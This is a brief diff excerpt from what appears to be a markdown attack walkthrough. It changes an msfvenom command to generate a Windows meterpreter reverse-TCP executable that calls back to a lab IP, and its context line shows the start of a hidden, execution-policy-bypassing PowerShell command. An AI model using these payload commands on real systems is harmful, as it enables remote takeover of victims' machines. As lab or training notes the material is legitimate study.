@@ -263,7 +263,7 @@ powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$c=New-Object System.Net.
 > Generate fun.exe
 
 ```zsh
-# msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.137.208 LPORT=9001 -f exe -o fun.exe
+# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.137.208 LPORT=5555 -f exe -o lol.exe
 ```
 
 > Victim
